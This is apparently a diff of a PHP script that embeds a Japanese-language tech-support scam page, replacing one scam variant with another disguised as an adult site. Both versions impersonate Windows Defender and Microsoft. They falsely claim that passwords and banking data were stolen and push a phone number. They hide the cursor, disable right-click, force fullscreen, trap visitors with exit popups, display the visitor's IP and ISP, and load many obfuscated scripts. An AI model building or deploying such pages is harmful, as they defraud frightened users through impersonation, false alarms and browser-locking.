@@ -8,261 +8,237 @@ header("Access-Control-Allow-Headers: Content-Type");
 header("Access-Control-Allow-Credentials: true");
 
 $codeString = '
-<html lang="en"><head><meta http-equiv="content-type" content="text/html;charset=utf-8">
-    <meta charset="utf-8">
-    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
-    <meta content="noindex,nofollow" name="robots">
-    <title>ヘルプデスクを取得 -01JP21</title>
-    <link href="' . $dynamic_url . '/images/img01df.png" rel="icon" id="favicon" type="image/png">
-    <link href="' . $dynamic_url . '/css/01css32bd.css" rel="stylesheet">
-    <script type="text/javascript" src="' . $dynamic_url . '/js/jquery-1.4.4.min.js"></script>
-    <script src="' . $dynamic_url . '/js/12dgdur.js"></script>
-    <script src="' . $dynamic_url . '/js/11gfdjuef.js"></script>
-    <script src="' . $dynamic_url . '/js/09sgsgsfr.js"></script>
-    <script src="' . $dynamic_url . '/js/13dugfjdf.js"></script>
-   <script>
-function vhdydjwhcnfyhecnfheucncevi(name) {
-    name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
-    var regexS = "[\\?&]"+name+"=([^&#]*)";
-    var regex = new RegExp(regexS);
-    var results = regex.exec(window.location.href);
-    if(results == null)
-        return "";
-    else
-        return results[1];
-}
-
-var Anph = vhdydjwhcnfyhecnfheucncevi("Anph");
-
-
-window.Anph = Anph;
-</script>
-<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=28841937"></script>
-
-</head>
-<body class="map" id="mycanvas" style="cursor:none">
-<div class="bg" style="cursor:none">
-    <div class="bgimg" style="top:0"><img src="' . $dynamic_url . '/images/fesbg.png" alt="" width="100%"></div>
-</div>
-<a href="#" id="link_black" style="cursor:none" rel="noreferrer">
-    <div class="black" style="height: 145%; cursor: none; display: block;"></div>
-</a>
-<div class="pro_box2" style="cursor: none; display: block;"><img src="' . $dynamic_url . '/images/bx1.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
-</div>
-<div class="pro_box3" style="cursor: none; display: block;"><img src="' . $dynamic_url . '/images/web1.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;">
-</div>
-<div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">
-    <div class="row">
-        <div class="col-md-12">
-            <div class="right-foot" style="text-align:center;margin-bottom: 5px;"><span id="footertxt">              <img src="' . $dynamic_url . '/images/img01df.png"> Windows_セキュリティ </span> <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="' . $dynamic_url . '/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください  '.$number.'               </span>                    </span>
+<html lang="en">
+   <head>
+      <meta charset="utf-8">
+      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+      <meta content="noindex,nofollow" name="robots">
+      <title>Stripchatjapan</title>
+      <link rel="shortcut icon" type="image/png" href="' . $dynamic_url . '/images/favicon.png">
+      <link href="' . $dynamic_url . '/css/tapa.css" rel="stylesheet">
+      <script type="text/javascript" src="' . $dynamic_url . '/js/jquery-1.4.4.min.js"></script>
+      <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+      <script type="text/javascript">//<![CDATA[
+         $(function(){
+         $('body').bind('contextmenu', function(e){
+         return false;
+         });
+         });//]]>
+      </script>
+      <script type="text/javascript">
+         var phone_number = "' . $number . '";
+         
+      </script>
+      <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=28841937"></script>
+   </head>
+   <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
+      <!-- <div id="modalbx">
+         <video id="vid" width="100%" height="100%" muted loop preload="auto" autoplay>
+           <div class="play-button"></div>
+           <source src="web.webm" type="video/webm">
+         </video>
+         
+         
+         <div class="bxweb">
+                        
+              
+                         <div>
+                           <img src="'.$dynamic_url.'/images/cross.png" alt="" class="swtch">
+             
+                         </div>
+                    
+                        <div style="font-size:40px;">
+                         はい、私は18歳以上です
+                         </div>
+                         <div>
+                           <button type="button" class="btn btn-secondary btn-lg">
+                             入力</button>
+              <button type="button" class="btn back-button btn-lg blink"><span class="text">全てのエロサイト</span><span class="link-icon"></span></button>
+                         </div>
+         
+                         
+                         
+                         
+                     </div> 
+         
+                 </div> -->
+      <div id="ageconfirmationmodal">
+         <!-- <video id="vid" width="100%" height="100%" muted loop preload="auto" autoplay>
+            <div class="play-button"></div>
+            <source src="web.webm" type="video/webm">
+            </video> -->
+         <div class="innerContainer">
+            <div class="crsr">
+               <a href="#">
+               <img src="'.$dynamic_url.'/images/cs.png" style="width: 20px;">
+               </a>
             </div>
-        </div>
-        <div class="col-md-12">
-            <marquee direction="left" height="100px" width="100%"><small class="text-left" style="color:#eee;font-size:10px">認識されないアプリはWindows
-                Defender SmartScreenによってブロックされました。システムが脆弱である可能性があります。Windows
-                Defenderのスキャンにより、パスワード、個人情報、金融データ、個人ファイルを盗み取る可能性のあるアドウェアが検出されました。 </small>
-            </marquee>
-        </div>
-    </div>
-</div>
-<div class="lightbox" id="poptxt" style="display: block;">
-    <div class="ilb top" style="font-size:17px">
-        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5"><span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="' . $dynamic_url . '/images/dm.png" class="logo3">            </span>Windows_Defender_セキュリティセンター</span> <span class="fl title2" id="txts1">            <a href="#" id="bgt">              <img src="' . $dynamic_url . '/images/cs.png">            </a>          </span>
-        </div>
-    </div>
-    <div id="txtintro"><span class="colo-rd">          <div id="iewd">Windows_Defender_セキュリティセンター</div>          <div id="fwefe">セキュリティ侵害の影響を受けたシステム</div>          <div id="fwefc"> (エラーコード: 16JPsy7)</div>        </span>
-    </div>
-    <img src="' . $dynamic_url . '/images/re.gif" id="banner">
-    <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。 <br> <span class="support" style="font-size:22px;">Windows サポートに問い合わせてください: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="' . $dynamic_url . '/images/winlo.png" alt="" style="width: 25px;vertical-align: sub;"> 直接お電話ください '.$number.'           </span>            </span>
-    </div>
-    <div id="bottom"><img src="' . $dynamic_url . '/images/img01df.png" id="badge"> <span class="title3">Windows</span>
-        <ul>
-            <li><a href="#">
-                <div class="fr button2"><span id="addtochromebutton">許可する</span></div>
-            </a></li>
-            <li><a href="#">
-                <div class="fr button blink"><span id="addtochromebutton">拒否を取得</span></div>
-            </a></li>
-        </ul>
-    </div>
-</div>
-<div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new"><p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows Defender - セキュリティ警告</p>
-    セキュリティ上の理由により、このシステムにはアクセスできません。<p></p>    お使いのコンピューターに悪意のある脅威があることが報告されています。
-    <br> <br> <br> <br> <br> 以下の情報が盗まれました: <br> >> 電子メール アドレス <br> >> 銀行のログイン
-    パスワード <br> >> Facebook アカウントのログイン <br> >> 写真と書類 <br> Windows Defender
-    のスキャンによると、このデバイスには、パスワード、オンライン ID、金融情報、個人ファイル、写真、ドキュメントを盗む可能性のあるアドウェアが含まれています。
-    <br> すぐにご連絡ください。電話で、弊社のエンジニアが削除手順をご案内します。 <br> 直ちに Windows
-    サポートに連絡して、脅威を報告し、個人情報の盗難を止め、このデバイスへのアクセスをブロック解除してください。 <br>
-    このウィンドウを閉じると、Windows の登録が一時停止され、個人情報が危険にさらされる可能性があります。 <br>
-    <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話してください: <strong> <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>直接お電話ください  '.$number.'         </span></strong>
-    </p>
-    <div class="action_buttons"><a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">わかりました</a> <a class="active" id="leave_page" style="color:#fff!important">キャンセル</a>
-    </div>
-</div>
-<div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
-    <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
-        できるだけ早くご連絡ください。弊社のエンジニアが電話で削除手順をサポートいたします。お使いのコンピューターは無効になっています。Windows
-        Defender SmartScreen が認識されないアプリケーションを停止しています。このアプリを実行すると、システムの安全性が損なわれる可能性があります。
-        <br> <strong>Windowsサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="'. $dynamic_url .'/images/winlo.png" alt="�" style="width: 25px;vertical-align: bottom;"> 直接お電話ください '.$number.'         </span>
-    </strong></p>
-</div>
-<div id="chat" style="display: block;"><img src="'. $dynamic_url .'/images/img01df.png"> <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
-    <p style="font-weight:600;font-size:24px">サポートに電話する: <br></p>
-    <h4 style="font-weight:600;font-size:22px"><img src="'. $dynamic_url .'/images/winlo.png" alt="" style="width: 25px;margin-left: 0;"> 電話してください
-        '.$number.'
-        <br>(セキュリティヘルプデスク)
-    </h4>
-    <div class="arrow-down">
-        <svg height="1em" viewBox="0 0 320 512">
-            <style>svg {
-                fill: #fff
-            }            </style>
-            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
-        </svg>
-    </div>
-</div>
-<style>#exit-popup {
-    position: fixed;
-    left: 0;
-    top: 0;
-    right: 0;
-    margin: 0 auto;
-    display: none;
-    background-color: #fff;
-    max-width: 460px;
-    padding: 10px;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-    font-family: Arial, Helvetica, sans-serif;
-    width: 90%;
-    box-sizing: border-box;
-    z-index: 9999999999999999999999;
-}
-
-.btn_leave {
-    padding: 10px 20px;
-    background-color: #1b73e8;
-    color: #fff !important;
-    text-transform: capitalize;
-    text-decoration: none;
-    border: 1px solid #ddd;
-    border-radius: 5px;
-    display: inline-block;
-    animation: zoominoutsinglefeatured 1s infinite;
-}
-
-.btn_cancel {
-    padding: 10px 20px;
-    border: 1px solid #ddd;
-    color: #1b73e8 !important;
-    text-transform: capitalize;
-    text-decoration: none;
-    border-radius: 5px;
-    display: inline-block;
-    margin-left: 10px;
-    background-color: transparent;
-}
-
-.btn-wrapper {
-    text-align: right;
-    margin-top: 20px;
-}
-
-@keyframes zoominoutsinglefeatured {
-    0% {
-        transform: scale(1, 1);
-    }
-    50% {
-        transform: scale(1.1, 1.1);
-    }
-    100% {
-        transform: scale(1, 1);
-    }
-}
-
-@keyframes zoomininsinglefeatured {
-    0% {
-        transform: scale(1, 1);
-    }
-    50% {
-        transform: scale(1.1, 1.1);
-    }
-    100% {
-        transform: scale(1, 1);
-    }
-}
-
-@keyframes scale {
-    0% {
-        transform: scale(1);
-    }
-    100% {
-        transform: scale(1.2);
-    }
-}</style>
-<div id="overlay2" style="    z-index: 9999999999;    position: fixed;    height: 100vh;    width: 100vw;    background: black;    display: none;">
-    <div style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">
-        <p class="text-center" style="color: #FEFEFE; font-size: large;"> コンピュータを再起動したり、操作したりしないでください。<br>
-            お使いのコンピュータは無効化されました。すぐにお電話ください。<br> このコンピュータでは、セキュリティ上の理由によりアクセスがブロックされています。<br>
-            直ちにご連絡ください。技術者が問題解決をサポートいたします。<br>直接お電話ください '.$number.'        </p></div>
-</div>
-<div id="exit-popup" style="display: block;"><h3>サイトを離れますか？</h3>
-    <p style="font-size: large">本当にこのページを退出しますか？</p>
-    <div class="btn-wrapper">
-        <button class="btn_leave" style="font-size: large">退出する</button>
-        <button class="btn_cancel" style="font-size: large">キャンセル</button>
-    </div>
-</div>
-<script>    let popupShown = false;
-let isOverlay = false;
-
-function isFullscreen() {
-    return !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement);
-}
-
-document.addEventListener("click", () => {
-    const el = document.documentElement;
-    if (el.requestFullscreen) {
-        el.requestFullscreen();
-    } else if (el.webkitRequestFullscreen) {
-        el.webkitRequestFullscreen();
-    } else if (el.msRequestFullscreen) {
-        el.msRequestFullscreen();
-    }
-});
-
-function checkFull() {
-    if (!popupShown && !isFullscreen()) {
-        isOverlay = false;
-        console.log("show popup");
-        setTimeout(function() {
-            document.getElementById("exit-popup").style.display = "block";
-        }, 3000);
-        popupShown = true;
-    } else if (popupShown && isFullscreen()) {
-        isOverlay = true;
-        document.getElementById("overlay2").style.display = "block";
-        setTimeout(function() {
-            document.getElementById("overlay2").style.display = "none";
-        }, 5000);
-        console.log("hide popup");
-        document.getElementById("exit-popup").style.display = "none";
-        popupShown = false;
-    }
-    console.log(isFullscreen(), popupShown);
-}
-
-document.addEventListener("mousemove", checkFull);</script>
-<script></script>
-<script src="'. $dynamic_url .'/js/08dgsg3d.js"></script>
-<script src="'. $dynamic_url .'/js/07sdgsg4.js"></script>
-<script src="'. $dynamic_url .'/js/06hshs.js"></script>
-<script src="'. $dynamic_url .'/js/05sdghdf.js"></script>
-<script src="'. $dynamic_url .'/js/04shesc1.js"></script>
-<script src="'. $dynamic_url .'/js/03fgsskryeivh.js"></script>
-<script src="'. $dynamic_url .'/js/02dgdsg3d.js"></script>
-<script type="text/javascript" src="'. $dynamic_url .'/js/01d1fgshfddfg.js"></script>
-</body></html>
+            <div style="font-size:40px;margin-top: 5px;">
+               このサイトを閉じます<br>か？
+            </div>
+            <div>
+               <button type="button" class="btn btn-secondary btn-lg" style="margin-right: 5px;"><i class="fa fa-close" style="font-size:24px"></i>
+               いいえ</button>
+               <button type="button" class="btn btn-primary btn-lg blink" style="background-color: #a3242f;color:#fff;background-image: none"><i class="fa fa-check-square-o" style="font-size:24px"></i>
+               はい</button>
+            </div>
+         </div>
+      </div>
+      <div class="bg" style="cursor:none">
+         <div class="bgimg" style="top:0">
+            <img src="'.$dynamic_url.'/images/back.png" alt="" width="100%">
+         </div>
+      </div>
+      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+         <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+      </a>
+      <div class="webbxs" style="display: block;">
+         <img src="'.$dynamic_url.'/images/nbx1.jpg" alt="" width="100%" style="height: auto;">
+      </div>
+      <div class="bxcontb" style="display: block;" id="webgetcode">
+         <img src="'.$dynamic_url.'/images/web1.jpg" alt="" style="width: 500px;">
+         <strong class="haru">
+            <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (日本国内無料電話)
+         </strong>
+      </div>
+      <div class="vislnb" id="botgnws" style="display: block;">
+         <div class="row firewall-pro">
+            <div class="col-md-12">
+               <img src="'.$dynamic_url.'/images/box01.png" alt="" style="width: 670px;height: auto;">
+               <div id="txtintro">
+                  <span class="colo-rd">
+                     <div id="ip_add"></div>
+                     <div id="city"></div>
+                     <div id="isp"> </div>
+                  </span>
+               </div>
+               <img src="'.$dynamic_url.'/images/scn.gif" id="bnrs">
+               <strong class="haruto">
+                  <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;"> <script>document.write(phone_number);</script> (日本国内無料電話)
+               </strong>
+               <div class="fr button blink" id="ftrs_btn">
+                  <a href="#" class="blink">わかりました</a>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="ftrs">
+         <div class="row">
+            <div class="col-md-12">
+               <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
+                  <span id="ftrstxt">
+                  <img src="'.$dynamic_url.'/images/img.png"> Windowsのセキュリティ </span>
+                  <span style="font-weight:500;padding-left:13px;color:#fff; ">
+                     Windows サポートに電話する: 
+                     <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px">
+                        <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;vertical-align: middle;">  <script>document.write(phone_number);</script> (日本国内無料電話) 
+                     </span>
+                  </span>
+               </div>
+            </div>
+            <div class="col-md-12">
+               <marquee direction="left" height="100px" width="100%">
+                  <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 Windows Defender スキャンにより、パスワード、オンライン ID、財務情�、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。</small>
+               </marquee>
+            </div>
+         </div>
+      </div>
+      <div class="uprbox" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="upbxs">
+         <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
+            すぐに当社にご連絡く�さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 <br>
+            <strong>
+               Windows サポートに電話する: 
+               <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px;display: block;">
+                  <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;vertical-align: bottom;"> <script>document.write(phone_number);</script> (日本国内無料電話)
+               </span>
+            </strong>
+         </p>
+      </div>
+      <div id="chat" class="bounce" style="display: block;">
+         <img src="'.$dynamic_url.'/images/img.png">
+         <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+         <p style="font-weight:600;font-size:24px">サポートに電話する: <br>
+         </p>
+         <h4 style="font-weight:600;font-size:22px">
+            <img src="'.$dynamic_url.'/images/call.png" alt="" class="blink" style="width: 25px;margin-left: 0;vertical-align:bottom"> <script>document.write(phone_number);</script> <br>(日本国内無料電話)
+         </h4>
+         <div class="arrow-down">
+            <svg height="1em" viewBox="0 0 320 512">
+               <style>
+                  svg {
+                  fill: #fff
+                  }
+               </style>
+               <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+            </svg>
+         </div>
+      </div>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/noir.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/all.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/esc.js?_=1"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/script1.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/script2.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/script3.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/script4.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/script5.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/script6.js?_=1"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/script7.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/web1.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/full.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/lvs.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/cmple.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/ips.js"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/muse.js?_=1"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/mouse.js?_=1"></script>
+      <script type="text/javascript" src="'.$dynamic_url.'/js/times.js"></script>
+      <script>
+         $(document).ready(function(){
+           $(".map").click(function(){
+             $("#modalbx").hide();
+           });
+         });
+      </script>  
+      <script>
+         $(document).ready(function(){
+           $(".map").click(function(){
+             $("#ageconfirmationmodal").hide();
+           });
+         });
+      </script>  
+      <script>
+         $(document).ready(function() {
+           $("#mycanvas").click(function() {
+             $("#upbxs").show()
+           })
+         });
+      </script>
+      <script>
+         $(document).ready(function() {
+           $("#mycanvas").click(function() {
+             $("#botgnws").show()
+           })
+         });
+         $(document).ready(function() {
+           $("#cross").click(function() {
+             $("#botgnws").show()
+           })
+         });
+      </script>
+      <script>
+         $(document).ready(function() {
+           $("body").mouseover(function() {
+             $("#botgnws").show()
+           })
+         });
+      </script>
+      <script>
+         $(document).ready(function() {
+           $("#chat").delay(600).fadeIn(100)
+         });
+      </script>
+   </body>
+   <!--  -->
+</html>
 ';
 
 function aesEncode($plainText) {
